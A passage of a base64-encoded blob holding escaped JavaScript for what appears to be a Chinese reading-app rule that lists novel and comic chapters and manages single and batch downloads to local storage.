gKyBjaGFwdGVyQWxsLmxlbmd0aCArIFxcXFxcXFwiKVxcXFxcXFwiKS5mb250Y29sb3IoXFxcXFxcXCIjMjNBRDZGXFxcXFxcXCIpIDogXFxcXFxcXCLlhajpg6goXFxcXFxcXCIgKyBjaGFwdGVyQWxsLmxlbmd0aCArIFxcXFxcXFwiKVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZShzZXQsIDAsIE1ZX0lEICsgXFxcXFxcXCI6cGFnZU51bVxcXFxcXFwiKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiXFxcXG4gICAgfSk7XFxcXG4gICAgZm9yIChsZXQgaSA9IDE7IGkgPCBjaGFwdGVyQ2h1bmsubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IHRhZ1RleHQgPSAoaSAtIDEpICogQ29uZmlnLnZpZXdQYWdlU2l6ZSArIFxcXFxcXFwiLVxcXFxcXFwiICsgKChpIC0gMSkgKiBDb25maWcudmlld1BhZ2VTaXplICsgY2hhcHRlckNodW5rW2ldLmxlbmd0aCk7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBpID09IHBhZ2VOdW0gPyBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgdGFnVGV4dC5mb250Y29sb3IoXFxcXFxcXCIjMjNBRDZGXFxcXFxcXCIpIDogdGFnVGV4dCxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKHNldCwgaSwgTVlfSUQgKyBcXFxcXFxcIjpwYWdlTnVtXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwic2Nyb2xsX2J1dHRvblxcXFxcXFwiXFxcXG4gICAgICAgIH0pO1xcXFxuICAgIH1cXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiB0YWdGaWx0ZXIgPT09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIFxcXFxcXFwi5YWo6YOoXFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiIzIzQUQ2RlxcXFxcXFwiKSA6IFxcXFxcXFwi5YWo6YOoXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKHNldCwgXFxcXFxcXCIwXFxcXFxcXCIsIE1ZX0lEICsgXFxcXFxcXCI6dGFnRmlsdGVyXFxcXFxcXCIpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiB0YWdGaWx0ZXIgPT09IFxcXFxcXFwiMVxcXFxcXFwiID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIFxcXFxcXFwi5pyq5LiL6L29XFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiIzIzQUQ2RlxcXFxcXFwiKSA6IFxcXFxcXFwi5pyq5LiL6L29XFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKHNldCwgXFxcXFxcXCIxXFxcXFxcXCIsIE1ZX0lEICsgXFxcXFxcXCI6dGFnRmlsdGVyXFxcXFxcXCIpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiB0YWdGaWx0ZXIgPT09IFxcXFxcXFwiMlxcXFxcXFwiID8gXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIFxcXFxcXFwi5bey5LiL6L29XFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiIzIzQUQ2RlxcXFxcXFwiKSA6IFxcXFxcXFwi5bey5LiL6L29XFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKHNldCwgXFxcXFxcXCIyXFxcXFxcXCIsIE1ZX0lEICsgXFxcXFxcXCI6dGFnRmlsdGVyXFxcXFxcXCIpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcbmxldCBjaGFwdGVyVGVhbSA9IFtdO1xcXFxubGV0IHJlY29yZCA9IFtdO1xcXFxuaWYgKGluZm8udHlwZSA9PT0gXFxcXFxcXCJjb21pY1xcXFxcXFwiKSB7XFxcXG4gICAgbGV0IGxhenkgPSAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBmaWxlbGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgoaW5wdXQpO1xcXFxuICAgICAgICBsZXQgcGljbGlzdCA9IGZpbGVsaXN0Lm1hcCgoaXRlbSwgaSkgPT4gXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBpbnB1dCArIFxcXFxcXFwiL1xcXFxcXFwiICsgKGkgKyAxKSArIFxcXFxcXFwiLmpwZ1xcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwicGljczovL1xcXFxcXFwiICsgcGljbGlzdC5qb2luKFxcXFxcXFwiJiZcXFxcXFxcIik7XFxcXG4gICAgfSk7XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBjb21GdW4oaSwgaXRlbSkge1xcXFxuICAgICAgICBsZXQgcm9vdFBhdGggPSBDb25maWcuY29taWNQYXRoICsgY3BhdGggKyBcXFxcXFxcIi9cXFxcXFxcIiArIGkgKyBcXFxcXFxcIiRBJFxcXFxcXFwiICsgaXRlbS50aXRsZTtcXFxcbiAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnFxcXFxcXFwiICsgaXRlbS50aXRsZSArIFxcXFxcXFwi4oCd4oCdXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IHJvb3RQYXRoICsgbGF6eSxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcXFxcXCIjXFxcXFxcXCIgKyBpLFxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBkZWZfRG9WaV9TdHlsZVxcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnW2luZm8udHlwZSArIFxcXFxcXFwiUGF0aFxcXFxcXFwiXSArY3BhdGgsIFxcXFxcXFwiZGlyXFxcXFxcXCIpLmZvckVhY2goKGZpbGUpID0+IHtcXFxcbiAgICAgICAgbGV0IGF0dCA9IFRvb2wuc3BsaXQoZmlsZS5uYW1lLCBcXFxcXFxcIiRcXFxcXFxcIiwgMik7XFxcXG4gICAgICAgIGlmIChhdHQubGVuZ3RoID09PSAzICYmIGF0dFsxXSA9PT0gKFxcXFxcXFwiQVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgcmVjb3JkLnB1c2goYXR0WzJdKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxufSBlbHNlIHtcXFxcbiAgICBmdW5jdGlvbiBjb21GdW4oaSwgaXRlbSkge1xcXFxuICAgICAgICByZXR1cm4ge1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCcXFxcXFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxNYWluQm9keSNhdXRvUGFnZSMjcmVhZFRoZW1lI1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNcXFxcXFxcIiArIGksXFxcXG4gICAgICAgICAgICAgICAgcGF0aDogQ29uZmlnLm5vdmVsUGF0aCArIGNwYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpICsgXFxcXFxcXCIkQSRcXFxcXFxcIiArIGl0ZW0udGl0bGUgKyBcXFxcXFxcIi50eHRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogaXRlbS50aXRsZVxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBkZWZfRG9WaV9TdHlsZVxcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnW2luZm8udHlwZSArIFxcXFxcXFwiUGF0aFxcXFxcXFwiXSArIGNwYXRoLCBcXFxcXFxcImZpbGVcXFxcXFxcIiwgXFxcXFxcXCIudHh0XFxcXFxcXCIpLmZvckVhY2goKGZpbGUpID0+IHtcXFxcbiAgICAgICAgbGV0IGF0dCA9IFRvb2wuc3BsaXQoZmlsZS5uYW1lLCBcXFxcXFxcIiRcXFxcXFxcIiwgMik7XFxcXG4gICAgICAgIGlmIChhdHQubGVuZ3RoID09PSAzICYmIGF0dFsxXSA9PT0gKFxcXFxcXFwiQVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgcmVjb3JkLnB1c2goYXR0WzJdLnNsaWNlKDAsIGF0dFsyXS5sYXN0SW5kZXhPZihcXFxcXFxcIi5cXFxcXFxcIikpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBjbGlja0Rvd25sb2FkKGl0ZW0sIGluZm8sIE1ZX0lELCBpKSB7XFxcXG4gICAgbGV0IGxvYWRpbmdUZWFtID0gSlNPTi5wYXJzZShnZXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmxvYWRpbmdUZWFtXFxcXFxcXCIsIFxcXFxcXFwiW11cXFxcXFxcIikgfHwgXFxcXFxcXCJbXVxcXFxcXFwiKTtcXFxcbiAgICBsZXQgRWxlbWVudEluZGV4ID0gbG9hZGluZ1RlYW0uaW5kZXhPZihpKTtcXFxcbiAgICBpZiAoRWxlbWVudEluZGV4ID4gLTEpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L29XFxcXFxcXCI7XFxcXG5cXFxcbiAgICBsb2FkaW5nVGVhbS5wdXNoKGkpO1xcXFxuICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6bG9hZGluZ1RlYW1cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkobG9hZGluZ1RlYW0pKTtcXFxcbiAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCY4oCYXFxcXFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcXFxcXCLigJnigJlcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwiI1xcXFxcXFwiICsgaVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGV0IHJlc3VsdCA9IFxcXFxcXFwidG9hc3Q6Ly/kuIvovb3lpLHotKVcXFxcXFxcIjtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICB0b2FzdChcXFxcXFxcIuW8gOWni+S4i+i9vTpcXFxcXFxcIiArIGl0ZW0udGl0bGUpO1xcXFxuICAgICAgICBsZXQgZG93bmxvYWQgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvRG93bmxvYWQuZXhlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICByZXN1bHQgPSBkb3dubG9hZChpdGVtLCBpbmZvLCBpLCBNWV9JRCk7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCcXFxcXFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcXFxcXCLigJ3igJ1cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogXFxcXFxcXCJ0b2FzdDovL+W3suS4i+i9vVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNcXFxcXFxcIiArIGlcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNcXFxcXFxcIiArIGlcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgIH0gZmluYWxseSB7XFxcXG4gICAgICAgIGxvYWRpbmdUZWFtLnNwbGljZShFbGVtZW50SW5kZXgsIDEpO1xcXFxuICAgICAgICBwdXRNeVZhcihNWV9JRCArIFxcXFxcXFwiOmxvYWRpbmdUZWFtXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGxvYWRpbmdUZWFtKSk7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiByZXN1bHQ7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNpbmdsZVZpZXcoKSB7XFxcXG4gICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLlj43ovazliJfooahcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKGlzUmV2ZXJzZSwgTVlfSUQpID0+IHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6aXNSZXZlcnNlXFxcXFxcXCIsIGlzUmV2ZXJzZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIgPyBcXFxcXFxcIjFcXFxcXFxcIiA6IFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgaXNSZXZlcnNlLCBNWV9JRCksXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/aWQ9MzNudkRxYkhIN0hXJnNpemU9NDgmZm9ybWF0PWdpZiZ0b2tlbj1cXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaWNvbl8yXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIuaJuemHj+S4i+i9vVxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoTVlfSUQpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBsb2FkaW5nVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpsb2FkaW5nVGVhbVxcXFxcXFwiLCBcXFxcXFxcIltdXFxcXFxcXCIpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBpZiAobG9hZGluZ1RlYW0ubGVuZ3RoID4gMCkgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/ov5jmnInku7vliqHmsqHmnInlrozmiJBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGlmIChnZXRBcHBWZXJzaW9uKCkgPCAyNTk0KSByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+acquW8gOaUvlxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjp2aWV3TW9kZVxcXFxcXFwiLCBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG5cXFxcbiAgICAgICAgfSwgTVlfSUQpLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcImh0dHBzOi8vaW1nLmljb25zOC5jb20vP2Zvcm1hdD1naWYmaWQ9MHVhZmFNTnp4ajg4JnRva2VuPVxcXFxcXFwiLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpY29uXzJcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIHNldFR5cGUoKTtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIGxldCBsb2FkaW5nVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpsb2FkaW5nVGVhbVxcXFxcXFwiLCBcXFxcXFxcIltdXFxcXFxcXCIpIHx8IFxcXFxcXFwiW11cXFxcXFxcIik7XFxcXG4gICAgZm9yIChsZXQgaSA9IDAsIGl0ZW0gPSBjaGFwdGVyTGlzdFswXTsgaSA8IGNoYXB0ZXJMaXN0Lmxlbmd0aDsgaXRlbSA9IGNoYXB0ZXJMaXN0WysraV0pIHtcXFxcbiAgICAgICAgbGV0IGlzX2Rvd25sb2FkID0gcmVjb3JkLmluY2x1ZGVzKGl0ZW0udGl0bGUpO1xcXFxuICAgICAgICBpZiAoaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgY2hhcHRlclRlYW0ucHVzaChjb21GdW4oaXRlbS5DSUQsIGl0ZW0pKTtcXFxcbiAgICAgICAgfSBlbHNlIGlmICghaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFxcXFxcIjJcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgY2hhcHRlclRlYW0ucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGxvYWRpbmdUZWFtLmluY2x1ZGVzKGl0ZW0uQ0lEKSA/IFxcXFxcXFwi4oCY4oCYXFxcXFxcXCIgKyBpdGVtLnRpdGxlICsgXFxcXFxcXCLigJnigJlcXFxcXFxcIiA6IGl0ZW0udGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoY2xpY2tEb3dubG9hZCwgaXRlbSwgaW5mbywgTVlfSUQsIGl0ZW0uQ0lEKSxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFxcXFxcIiNcXFxcXFxcIiArIGl0ZW0uQ0lEXFxcXG4gICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogZGVmX0RvVmlfU3R5bGVcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBjbGlja0Nob29zZSh0aXRsZSwgTVlfSUQsIGkpIHtcXFxcbiAgICBsZXQgaXNTdGFydCA9IGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6aXNTdGFydFxcXFxcXFwiKTtcXFxcbiAgICBpZiAoaXNTdGFydCA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L29Li4uXFxcXFxcXCI7XFxcXG4gICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgIGxldCBFbGVtZW50SW5kZXggPSBiYXRjaFRlYW0uaW5kZXhPZihpKTtcXFxcbiAgICBpZiAoRWxlbWVudEluZGV4ID4gLTEpIHtcXFxcbiAgICAgICAgdXBkYXRlSXRlbSh7XFxcXG4gICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwiI1xcXFxcXFwiICsgaVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgYmF0Y2hUZWFtLnNwbGljZShFbGVtZW50SW5kZXgsIDEpO1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCY4oCYXFxcXFxcXCIgKyB0aXRsZSArIFxcXFxcXFwi4oCZ4oCZXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXFxcXFwiI1xcXFxcXFwiICsgaVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgYmF0Y2hUZWFtLnB1c2goaSk7XFxcXG4gICAgfVxcXFxuICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6YmF0Y2hUZWFtXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KGJhdGNoVGVhbSkpO1xcXFxuICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gYmF0Y2hWaWV3KCkge1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Y2V6YCJ5LiL6L29XFxcXFxcXCIsXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/aWQ9UElpY3ZGNmViek1uJnNpemU9NDgmZm9ybWF0PWdpZiZ0b2tlbj1cXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKE1ZX0lEKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjppc1N0YXJ0XFxcXFxcXCIpID09PSBcXFxcXFxcIjFcXFxcXFxcIikgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mraPlnKjmibnph4/kuIvovb1cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6dmlld01vZGVcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXFxcXFwiOmJhdGNoVGVhbVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgTVlfSUQpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpY29uX3NtYWxsXzRcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIGxldCBzdGFydCA9IENvbmZpZy52aWV3UGFnZVNpemUgKiBNYXRoLm1heChwYWdlTnVtIC0gMSwgMCk7XFxcXG4gICAgbGV0IGVuZCA9IHN0YXJ0ICsgY2hhcHRlckxpc3QubGVuZ3RoO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi6YCJ5oup5YWo6YOoXFxcXFxcXCIsXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/Zm9ybWF0PWdpZiZpZD0xSFZjSExvTnpyaXQmdG9rZW49XFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChzdGFydCwgZW5kLCBNWV9JRCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6aXNTdGFydFxcXFxcXFwiKSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGNob29zZVRlYW0gPSBUb29sLnJhbmdlKHN0YXJ0LCBlbmQpO1xcXFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgXFxcXFxcXCJbXVxcXFxcXFwiKSB8fCBcXFxcXFxcIltdXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgYmF0Y2hUZWFtID0gQXJyYXkuZnJvbShuZXcgU2V0KGJhdGNoVGVhbS5jb25jYXQoY2hvb3NlVGVhbSkpKTtcXFxcbiAgICAgICAgICAgIGxldCBjb21wbGV0ZWQgPSBKU09OLnBhcnNlKGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6Y29tcGxldGVkXFxcXFxcXCIsIFxcXFxcXFwiW11cXFxcXFxcIikgfHwgXFxcXFxcXCJbXVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGJhdGNoVGVhbSA9IGJhdGNoVGVhbS5maWx0ZXIoKGkpID0+ICFjb21wbGV0ZWQuaW5jbHVkZXMoaSkpO1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFxcXFxcIjpiYXRjaFRlYW1cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoYmF0Y2hUZWFtKSk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgfSwgc3RhcnQsIGVuZCwgTVlfSUQpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpY29uX3NtYWxsXzRcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Y+W5raI5YWo6YOoXFxcXFxcXCIsXFxcXG4gICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/Zm9ybWF0PWdpZiZpZD1IekVqUHBJM05MOEQmdG9rZW49XFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChzdGFydCwgZW5kLCBNWV9JRCkgPT4ge1xcXFxuICAgICAgICAgICAgaWYgKGdldE15VmFyKE1ZX0lEICsgXFxcXFxcXCI6aXNTdGFydFxcXFxcXFwiKSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFn